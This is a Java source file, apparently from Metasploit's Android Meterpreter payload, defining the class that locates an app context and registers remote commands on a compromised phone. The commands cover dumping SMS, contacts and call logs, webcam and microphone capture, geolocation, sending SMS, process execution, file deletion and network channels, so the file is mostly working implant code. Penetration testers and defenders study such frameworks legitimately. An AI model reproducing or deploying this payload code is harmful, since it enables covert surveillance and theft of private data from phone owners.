package com.metasploit.meterpreter;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;

import com.metasploit.meterpreter.android.activity_start_android;
import com.metasploit.meterpreter.android.check_root_android;
import com.metasploit.meterpreter.android.dump_calllog_android;
import com.metasploit.meterpreter.android.dump_contacts_android;
import com.metasploit.meterpreter.android.dump_sms_android;
import com.metasploit.meterpreter.android.geolocate_android;
import com.metasploit.meterpreter.android.interval_collect;
import com.metasploit.meterpreter.android.send_sms_android;
import com.metasploit.meterpreter.android.set_audio_mode_android;
import com.metasploit.meterpreter.android.set_wallpaper_android;
import com.metasploit.meterpreter.android.sqlite_query_android;
import com.metasploit.meterpreter.android.stdapi_fs_file_expand_path_android;
import com.metasploit.meterpreter.android.stdapi_sys_config_getuid;
import com.metasploit.meterpreter.android.stdapi_sys_config_sysinfo_android;
import com.metasploit.meterpreter.android.stdapi_sys_process_get_processes_android;
import com.metasploit.meterpreter.android.webcam_audio_record_android;
import com.metasploit.meterpreter.android.webcam_get_frame_android;
import com.metasploit.meterpreter.android.webcam_list_android;
import com.metasploit.meterpreter.android.webcam_start_android;
import com.metasploit.meterpreter.android.webcam_stop_android;
import com.metasploit.meterpreter.android.wlan_geolocate;
import com.metasploit.meterpreter.stdapi.Loader;
import com.metasploit.meterpreter.stdapi.channel_create_stdapi_fs_file;
import com.metasploit.meterpreter.stdapi.channel_create_stdapi_net_tcp_client;
import com.metasploit.meterpreter.stdapi.channel_create_stdapi_net_tcp_server;
import com.metasploit.meterpreter.stdapi.channel_create_stdapi_net_udp_client;
import com.metasploit.meterpreter.stdapi.stdapi_fs_chdir;
import com.metasploit.meterpreter.stdapi.stdapi_fs_delete_dir;
import com.metasploit.meterpreter.stdapi.stdapi_fs_delete_file;
import com.metasploit.meterpreter.stdapi.stdapi_fs_getwd;
import com.metasploit.meterpreter.stdapi.stdapi_fs_ls;
import com.metasploit.meterpreter.stdapi.stdapi_fs_md5;
import com.metasploit.meterpreter.stdapi.stdapi_fs_mkdir;
import com.metasploit.meterpreter.stdapi.stdapi_fs_search;
import com.metasploit.meterpreter.stdapi.stdapi_fs_separator;
import com.metasploit.meterpreter.stdapi.stdapi_fs_sha1;
import com.metasploit.meterpreter.stdapi.stdapi_fs_stat;
import com.metasploit.meterpreter.stdapi.stdapi_net_config_get_interfaces_V1_4;
import com.metasploit.meterpreter.stdapi.stdapi_net_config_get_routes_V1_4;
import com.metasploit.meterpreter.stdapi.stdapi_net_socket_tcp_shutdown_V1_3;
import com.metasploit.meterpreter.stdapi.stdapi_sys_process_execute_V1_3;

import java.io.DataInputStream;
import java.io.File;
import java.io.OutputStream;
import java.lang.reflect.Method;

public class AndroidMeterpreter extends Meterpreter {

    private static final Object contextWaiter = new Object();

    private static String writeableDir;
    private static Context context;

    private final IntervalCollectionManager intervalCollectionManager;

    private void findContext() throws Exception {
        Class<?> activityThreadClass;
        try {
            activityThreadClass = Class.forName("android.app.ActivityThread");
        } catch (ClassNotFoundException e) {
            // No context (running as root?)
            return;
        }
        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
        context = (Context) currentApplication.invoke(null, (Object[]) null);
        if (context == null) {
            // Post to the UI/Main thread and try and retrieve the Context
            final Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                public void run() {
                    synchronized (contextWaiter) {
                        try {
                            context = (Context) currentApplication.invoke(null, (Object[]) null);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        contextWaiter.notify();
                    }
                }
            });
            synchronized (contextWaiter) {
                if (context == null) {
                    contextWaiter.wait(100);
                }
            }
        }
    }

    public IntervalCollectionManager getIntervalCollectionManager() {
        return this.intervalCollectionManager;
    }

    public static Context getContext() {
        return context;
    }

    public AndroidMeterpreter(DataInputStream in, OutputStream rawOut, String[] parameters, boolean redirectErrors) throws Exception {
        super(in, rawOut, true, redirectErrors, false);
        writeableDir = parameters[0];
        try {
            findContext();
        } catch (Exception e) {
            e.printStackTrace();
        }

        this.intervalCollectionManager = new IntervalCollectionManager(getContext());
        this.intervalCollectionManager.start();
        startExecuting();
        this.intervalCollectionManager.stop();
    }

    @Override
    protected String getPayloadTrustManager() {
        return "com.metasploit.stage.PayloadTrustManager";
    }

    @Override
    public String[] loadExtension(byte[] data) throws Exception {
        getCommandManager().resetNewCommands();
        CommandManager mgr = getCommandManager();
        Loader.cwd = new File(writeableDir);
        mgr.registerCommand("channel_create_stdapi_fs_file", channel_create_stdapi_fs_file.class);
        mgr.registerCommand("channel_create_stdapi_net_tcp_client", channel_create_stdapi_net_tcp_client.class);
        mgr.registerCommand("channel_create_stdapi_net_tcp_server", channel_create_stdapi_net_tcp_server.class);
        mgr.registerCommand("channel_create_stdapi_net_udp_client", channel_create_stdapi_net_udp_client.class);
        mgr.registerCommand("stdapi_fs_chdir", stdapi_fs_chdir.class);
        mgr.registerCommand("stdapi_fs_delete_dir", stdapi_fs_delete_dir.class);
        mgr.registerCommand("stdapi_fs_delete_file", stdapi_fs_delete_file.class);
        mgr.registerCommand("stdapi_fs_file_expand_path", stdapi_fs_file_expand_path_android.class);
        mgr.registerCommand("stdapi_fs_getwd", stdapi_fs_getwd.class);
        mgr.registerCommand("stdapi_fs_ls", stdapi_fs_ls.class);
        mgr.registerCommand("stdapi_fs_mkdir", stdapi_fs_mkdir.class);
        mgr.registerCommand("stdapi_fs_md5", stdapi_fs_md5.class);
        mgr.registerCommand("stdapi_fs_search", stdapi_fs_search.class);
        mgr.registerCommand("stdapi_fs_separator", stdapi_fs_separator.class);
        mgr.registerCommand("stdapi_fs_stat", stdapi_fs_stat.class);
        mgr.registerCommand("stdapi_fs_sha1", stdapi_fs_sha1.class);
        mgr.registerCommand("stdapi_net_config_get_interfaces", stdapi_net_config_get_interfaces_V1_4.class);
        mgr.registerCommand("stdapi_net_config_get_routes", stdapi_net_config_get_routes_V1_4.class);
        mgr.registerCommand("stdapi_net_socket_tcp_shutdown", stdapi_net_socket_tcp_shutdown_V1_3.class);
        mgr.registerCommand("stdapi_sys_config_getuid", stdapi_sys_config_getuid.class);
        mgr.registerCommand("stdapi_sys_config_sysinfo", stdapi_sys_config_sysinfo_android.class);
        mgr.registerCommand("stdapi_sys_process_execute", stdapi_sys_process_execute_V1_3.class);
        mgr.registerCommand("stdapi_sys_process_get_processes", stdapi_sys_process_get_processes_android.class);
        if (context != null) {
            mgr.registerCommand("webcam_audio_record", webcam_audio_record_android.class);
            mgr.registerCommand("webcam_list", webcam_list_android.class);
            mgr.registerCommand("webcam_start", webcam_start_android.class);
            mgr.registerCommand("webcam_stop", webcam_stop_android.class);
            mgr.registerCommand("webcam_get_frame", webcam_get_frame_android.class);
            mgr.registerCommand("dump_sms", dump_sms_android.class);
            mgr.registerCommand("dump_contacts", dump_contacts_android.class);
            mgr.registerCommand("geolocate", geolocate_android.class);
            mgr.registerCommand("dump_calllog", dump_calllog_android.class);
            mgr.registerCommand("check_root", check_root_android.class);
            mgr.registerCommand("send_sms", send_sms_android.class);
            mgr.registerCommand("wlan_geolocate", wlan_geolocate.class);
            mgr.registerCommand("interval_collect", interval_collect.class);
            mgr.registerCommand("activity_start", activity_start_android.class);
            mgr.registerCommand("set_audio_mode", set_audio_mode_android.class);
            mgr.registerCommand("sqlite_query", sqlite_query_android.class);
            mgr.registerCommand("set_wallpaper", set_wallpaper_android.class);
        }
        return getCommandManager().getNewCommands();
    }
}

